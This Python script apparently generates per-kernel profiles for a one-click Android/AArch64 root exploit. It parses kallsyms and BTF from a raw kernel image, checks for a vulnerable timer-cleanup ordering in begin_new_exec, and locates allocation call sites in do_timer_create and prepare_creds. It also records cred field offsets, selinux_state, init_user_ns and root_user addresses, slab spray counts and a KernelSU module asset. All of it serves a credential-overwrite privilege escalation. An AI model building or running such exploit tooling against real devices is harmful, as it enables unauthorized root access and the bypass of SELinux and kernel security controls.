#!/usr/bin/env python3
"""Generate an HOneClick 98260 profile from a raw AArch64 kernel Image."""
from __future__ import annotations

import argparse
import json
import re
import struct
import sys
from pathlib import Path

IMAGE_BASE = 0xFFFFFFC080000000
BTF_MAGIC = b"\x9f\xeb"
KIND_STRUCT = 4
KIND_UNION = 5


def align(value: int, alignment: int) -> int:
    return (value + alignment - 1) & ~(alignment - 1)


def _plausible_kernel_base(value: int) -> bool:
    """Kernel link addresses are page aligned and in the top canonical range."""
    return value >= 0xFFFFFF8000000000 and (value & 0xFFF) == 0


def _symbol_address(base: int, raw: int) -> int:
    """kallsyms offsets are either absolute or signed 32-bit relative to base."""
    value = raw & 0xFFFFFFFF
    if value >= 0x80000000:
        return base - (0x100000000 - value)
    return base + value


def _text_matches_base(symbols: list[tuple[int, str, str]], base: int) -> bool:
    text = next((address for address, name, _ in symbols if name == "_text"), None)
    return text is not None and (text == base or 0 <= text - base <= 0x200000)


def _try_parse_names(
    image: bytes,
    names_pos: int,
    count: int,
    token_start: int,
    tokens: list[str],
    offsets: int,
    base: int,
) -> tuple[list[tuple[int, str, str]], int] | None:
    cursor = names_pos + 8
    encoded: list[str] = []
    try:
        for _ in range(count):
            length = image[cursor]
            cursor += 1
            if length & 0x80:
                length = (length & 0x7F) | (image[cursor] << 7)
                cursor += 1
            name = "".join(tokens[x] for x in image[cursor:cursor + length])
            cursor += length
            if not name:
                return None
            encoded.append(name)
    except (IndexError, ValueError):
        return None
    if (
        not encoded
        or cursor > token_start
        or token_start - cursor >= 0x5000
        or "_text" not in [name[1:] for name in encoded[:32]]
    ):
        return None
    addresses = struct.unpack_from(f"<{count}I", image, offsets)
    symbols = [
        (_symbol_address(base, address), name[1:], name[0])
        for address, name in zip(addresses, encoded)
    ]
    if not _text_matches_base(symbols, base):
        return None
    return symbols, token_start - cursor


def parse_kallsyms(image: bytes) -> tuple[list[tuple[int, str, str]], int, int]:
    """Return (symbols, gap, relative_base).

    The base is not fixed: 6.18 images use 0xffffffc080000000, while some
    6.1 images use 0xffffffc008000000.  Locate the relative_base word after
    the offsets table and validate it through _text.
    """
    alphabet = b"".join(bytes((i, 0)) for i in range(ord("a"), ord("z") + 1))
    search = 0
    while True:
        marker = image.find(alphabet, search)
        if marker < 0:
            raise ValueError("kallsyms token table not found")
        search = marker + 1
        try:
            start = marker
            for _ in range(97):
                start = image.rfind(b"\0", 0, start - 1) + 1
            tokens: list[str] = []
            pos = start
            for _ in range(256):
                end = image.index(0, pos)
                tokens.append(image[pos:end].decode("ascii"))
                pos = end + 1
            index_pos = align(pos, 8)
            expected = b"".join(
                struct.pack("<H", sum(len(token) + 1 for token in tokens[:i]))
                for i in range(256)
            )
            if image[index_pos:index_pos + 512] != expected:
                continue
            offsets = index_pos + 512
        except (ValueError, UnicodeDecodeError):
            continue

        # The relative_base follows the offsets array.  Different builds put
        # 0..64 bytes of padding between them, and the base itself is not
        # always 0xffffffc080000000.  Scan a bounded window, then use the
        # distance to that word as the symbol count estimate.
        window_end = min(len(image) - 8, offsets + 0x4000)
        for base_pos in range(align(offsets, 8), window_end, 8):
            base = struct.unpack_from("<Q", image, base_pos)[0]
            if not _plausible_kernel_base(base):
                continue
            estimate = (base_pos - offsets) // 4
            for count in range(max(1, estimate - 8), estimate + 9):
                needle = struct.pack("<I", count)
                names_pos = image.find(needle, max(0, start - 0x400000), start)
                while names_pos >= 0:
                    if names_pos % 4 == 0:
                        parsed = _try_parse_names(
                            image, names_pos, count, start, tokens, offsets, base
                        )
                        if parsed is not None:
                            return parsed[0], parsed[1], base
                    names_pos = image.find(needle, names_pos + 1, start)
    raise ValueError("kallsyms names block not found")


class Btf:
    def __init__(self, image: bytes):
        self.image = image
        self.base = self._find()
        header = struct.unpack_from("<HBBIIIII", image, self.base)
        _, version, _, header_len, type_off, type_len, str_off, str_len = header
        if version != 1 or header_len != 24:
            raise ValueError("unsupported BTF header")
        self.type_start = self.base + header_len + type_off
        self.type_end = self.type_start + type_len
        self.str_start = self.base + header_len + str_off
        self.str_end = self.str_start + str_len
        self.types = self._parse_types()

    def _find(self) -> int:
        pos = 0
        while True:
            pos = self.image.find(BTF_MAGIC, pos)
            if pos < 0:
                raise ValueError("BTF section not found")
            if pos + 24 > len(self.image):
                raise ValueError("BTF section truncated")
            magic, version, _, header_len, type_off, type_len, str_off, str_len = (
                struct.unpack_from("<HBBIIIII", self.image, pos)
            )
            str_start = pos + header_len + str_off
            if (
                magic == 0xEB9F
                and version == 1
                and header_len == 24
                and 0 < type_len < 20_000_000
                and 0 < str_len < 4_000_000
                and str_start + str_len <= len(self.image)
            ):
                return pos
            pos += 1

    def string(self, offset: int) -> str:
        if offset == 0:
            return ""
        end = self.image.find(b"\0", self.str_start + offset, self.str_end)
        if end < 0:
            return ""
        return self.image[self.str_start + offset:end].decode("utf-8", "replace")

    def _parse_types(self) -> list[dict | None]:
        result: list[dict | None] = [None]
        pos = self.type_start
        while pos < self.type_end:
            name_off, info, size = struct.unpack_from("<III", self.image, pos)
            pos += 12
            kind = (info >> 24) & 0x1F
            vlen = info & 0xFFFF
            kflag = bool(info >> 31)
            entry = {"name": self.string(name_off), "kind": kind, "size": size, "members": []}
            if kind == 1:
                pos += 4
            elif kind == 3:
                pos += 12
            elif kind in (KIND_STRUCT, KIND_UNION):
                for _ in range(vlen):
                    member_name, _, bit_offset = struct.unpack_from("<III", self.image, pos)
                    pos += 12
                    if kflag:
                        bit_offset &= 0xFFFFFF
                    entry["members"].append((self.string(member_name), bit_offset // 8))
            elif kind in (6,):
                pos += 8 * vlen
            elif kind == 19:
                pos += 12 * vlen
            elif kind == 13:
                pos += 8 * vlen
            elif kind == 14:
                pos += 4
            elif kind == 15:
                pos += 12 * vlen
            elif kind == 17:
                pos += 4
            result.append(entry)
        return result

    def structure(self, name: str) -> dict:
        matches = [
            entry for entry in self.types
            if entry and entry["kind"] in (KIND_STRUCT, KIND_UNION) and entry["name"] == name
        ]
        if not matches:
            raise ValueError(f"BTF struct not found: {name}")
        return matches[0]

    @staticmethod
    def member_offsets(structure: dict) -> dict[str, int]:
        return {name: offset for name, offset in structure["members"] if name}


def parse_kernel_release(image: bytes) -> str:
    match = re.search(rb"Linux version ([^\s]+)", image)
    if not match:
        raise ValueError("kernel release string not found; pass --kernel-release")
    return match.group(1).decode("ascii", "replace")


def bl_target(pc: int, instruction: int) -> int | None:
    if instruction & 0xFC000000 != 0x94000000:
        return None
    immediate = instruction & 0x03FFFFFF
    if immediate & 0x02000000:
        immediate -= 0x04000000
    return pc + immediate * 4


def find_bl_call_site(
    image: bytes,
    base: int,
    function: int,
    targets: list[tuple[str, int]],
    span: int = 0x1200,
    function_end: int | None = None,
) -> tuple[int, str]:
    """Find the first bl to one of targets inside function.

    Returns (return address, callee name).  A CFI thunk normally sits within
    0x80 bytes before the real target, so accept that window as well.  Stop at
    the next symbol when it is available: scanning past the function boundary
    can accidentally pick up a call from the following function.
    """
    start = function - base
    if start < 0 or start >= len(image):
        raise ValueError(f"function outside image: {hex(function)}")
    end = min(len(image) - 4, start + span)
    if function_end is not None:
        end = min(end, function_end - base - 4)
    for offset in range(start, end + 1, 4):
        pc = base + offset
        target = bl_target(pc, struct.unpack_from("<I", image, offset)[0])
        if target is None:
            continue
        for name, address in targets:
            if abs(target - address) <= 0x80:
                return pc + 4, name
    raise ValueError(f"kmem_cache_alloc call site not found in {hex(function)}")


def _next_symbol(symbols: dict[str, int], function: int, span: int = 0x1200) -> int:
    end = function + span
    for address in symbols.values():
        if function < address < end:
            end = address
    return end


def find_alloc_call_sites(
    image: bytes, symbols: dict[str, int], base: int
) -> tuple[int, str, int, str]:
    alloc = sorted(
        (name, address) for name, address in symbols.items()
        if "kmem_cache_alloc" in name
    )
    if not alloc:
        raise ValueError("missing kmem_cache_alloc symbols")
    exact = [(name, address) for name, address in alloc if name == "kmem_cache_alloc"]
    timer_targets = exact or alloc
    cred_targets = exact or alloc
    timer_start = symbols["do_timer_create"]
    cred_start = symbols["prepare_creds"]
    timer_link, timer_name = find_bl_call_site(
        image, base, timer_start, timer_targets,
        function_end=_next_symbol(symbols, timer_start),
    )
    cred_link, cred_name = find_bl_call_site(
        image, base, cred_start, cred_targets,
        function_end=_next_symbol(symbols, cred_start),
    )
    return timer_link, timer_name, cred_link, cred_name


def vulnerability_status(
    image: bytes, symbols: dict[str, int], base: int
) -> tuple[bool, dict[str, int]]:
    required = [
        "begin_new_exec", "unshare_files", "exec_task_namespaces",
        "posix_cpu_timers_exit", "exit_itimers",
    ]
    missing = [name for name in required if name not in symbols]
    if missing:
        raise ValueError("missing symbols: " + ", ".join(missing))
    ordered = sorted((address, name) for name, address in symbols.items())
    begin = symbols["begin_new_exec"]
    end = next((address for address, _ in ordered if address > begin), begin + 0x1000)
    calls: dict[str, int] = {}
    wanted = set(required[1:])
    for pc in range(begin, min(end, begin + 0x2000), 4):
        offset = pc - base
        if offset < 0 or offset + 4 > len(image):
            break
        target = bl_target(pc, struct.unpack_from("<I", image, offset)[0])
        if target is None:
            continue
        for name in wanted:
            if target == symbols[name]:
                calls[name] = pc
    missing_calls = [name for name in required[1:] if name not in calls]
    if missing_calls:
        raise ValueError("vulnerability calls not found: " + ", ".join(missing_calls))
    vulnerable = (
        calls["posix_cpu_timers_exit"] > calls["unshare_files"]
        and calls["posix_cpu_timers_exit"] > calls["exec_task_namespaces"]
    )
    return vulnerable, calls


def build_profile(
    image_path: Path,
    kernel_release: str | None,
    profile_id: str | None,
    symbols_asset: str,
    module_asset: str,
    slab_objects: int,
    slab_pages: int,
) -> tuple[dict, list[tuple[int, str, str]]]:
    image = image_path.read_bytes()
    symbols, kallsyms_gap, base = parse_kallsyms(image)
    symbol_map: dict[str, int] = {}
    for address, name, _ in symbols:
        symbol_map.setdefault(name, address)
    release = kernel_release or parse_kernel_release(image)
    vulnerable, calls = vulnerability_status(image, symbol_map, base)

    btf = Btf(image)
    kitimer = btf.structure("k_itimer")
    task = btf.structure("task_struct")
    cred = btf.structure("cred")
    task_offsets = btf.member_offsets(task)
    cred_offsets = btf.member_offsets(cred)
    kitimer_offsets = btf.member_offsets(kitimer)
    if "cred" not in task_offsets:
        raise ValueError("task_struct.cred not found")
    if "it" not in kitimer_offsets:
        raise ValueError("k_itimer.it not found")

    required_cred = ["uid", "security", "user", "user_ns", "group_info"]
    missing_cred = [name for name in required_cred if name not in cred_offsets]
    if missing_cred:
        raise ValueError("cred is missing fields: " + ", ".join(missing_cred))

    static_symbols = [
        "do_timer_create", "prepare_creds", "selinux_state", "init_user_ns",
        "root_user", "init_groups",
    ]
    missing = [name for name in static_symbols if name not in symbol_map]
    if missing:
        raise ValueError("missing symbols: " + ", ".join(missing))

    timer_link, timer_name, cred_link, cred_name = find_alloc_call_sites(
        image, symbol_map, base
    )
    profile_id = profile_id or "kernel-" + re.sub(r"[^A-Za-z0-9_.-]+", "-", release)
    profile = {
        "id": profile_id,
        "kernel": release,
        "relative_base": hex(base),
        "timer_link": hex(timer_link),
        "cred_link": hex(cred_link),
        "slide_site_low": hex(timer_link & 0x1FFFFF),
        "cred_site_low": hex(cred_link & 0x1FFFFF),
        "selinux_link": hex(symbol_map["selinux_state"]),
        "user_ns": hex(symbol_map["init_user_ns"]),
        "root_user": hex(symbol_map["root_user"]),
        "groups": hex(symbol_map["init_groups"]),
        "ucounts": hex(symbol_map.get("init_ucounts", 0)),
        "kitimer_size": kitimer["size"],
        "kitimer_node": kitimer_offsets["it"] + 0,
        "task_size": task["size"],
        "task_cred": task_offsets["cred"],
        "cred_size": cred["size"],
        "cred_uid": cred_offsets["uid"],
        "cred_suid": cred_offsets.get("suid", 0),
        "cred_security": cred_offsets["security"],
        "cred_user": cred_offsets["user"],
        "cred_user_ns": cred_offsets["user_ns"],
        "cred_ucounts": cred_offsets.get("ucounts", 0),
        "cred_groups": cred_offsets["group_info"],
        "cred_cap_inheritable": cred_offsets.get("cap_inheritable", 0),
        "cred_cap_permitted": cred_offsets.get("cap_permitted", 0),
        "cred_cap_effective": cred_offsets.get("cap_effective", 0),
        "cred_cap_bset": cred_offsets.get("cap_bset", 0),
        "cred_cap_ambient": cred_offsets.get("cap_ambient", 0),
        "slab_objects": slab_objects,
        "slab_pages": slab_pages,
        "module_asset": module_asset,
        "symbols_asset": symbols_asset,
        "vulnerable": vulnerable,
        "audit": {
            "begin_new_exec": hex(symbol_map["begin_new_exec"]),
            "calls": {name: hex(address) for name, address in calls.items()},
            "timer_site": timer_name,
            "cred_site": cred_name,
            "kallsyms": len(symbols),
            "kallsyms_gap": kallsyms_gap,
            "kallsyms_base": hex(base),
            "btf_base": hex(btf.base),
        },
    }
    if not vulnerable:
        raise ValueError("kernel does not match the vulnerable cleanup ordering")
    return profile, symbols


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("kernel_image", type=Path, help="raw AArch64 Image / kernel.bin")
    parser.add_argument("--kernel-release")
    parser.add_argument("--id")
    parser.add_argument("--symbols-out", required=True, type=Path)
    parser.add_argument("--symbols-asset")
    parser.add_argument("--module-asset", default="ksu-template-custom.ko")
    parser.add_argument("--slab-objects", type=int, default=21)
    parser.add_argument("--slab-pages", type=int, default=2)
    parser.add_argument("--profile-json", type=Path)
    parser.add_argument("--update-profiles", type=Path)
    args = parser.parse_args()

    symbols_asset = args.symbols_asset or args.symbols_out.name
    profile, symbols = build_profile(
        args.kernel_image,
        args.kernel_release,
        args.id,
        symbols_asset,
        args.module_asset,
        args.slab_objects,
        args.slab_pages,
    )
    args.symbols_out.parent.mkdir(parents=True, exist_ok=True)
    args.symbols_out.write_text(
        "".join(f"{address:016x} {kind} {name}\n" for address, name, kind in symbols)
    )
    if args.profile_json:
        args.profile_json.parent.mkdir(parents=True, exist_ok=True)
        args.profile_json.write_text(json.dumps(profile, indent=2) + "\n")
    if args.update_profiles:
        root = json.loads(args.update_profiles.read_text())
        profiles = root.setdefault("profiles", [])
        profiles = [item for item in profiles if item.get("kernel") != profile["kernel"]]
        profiles.append(profile)
        root["profiles"] = profiles
        args.update_profiles.write_text(json.dumps(root, indent=2) + "\n")
    print(json.dumps(profile, indent=2))
    print(f"symbols: {len(symbols)} -> {args.symbols_out}", file=sys.stderr)
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        print(f"error: {exc}", file=sys.stderr)
        raise SystemExit(1)
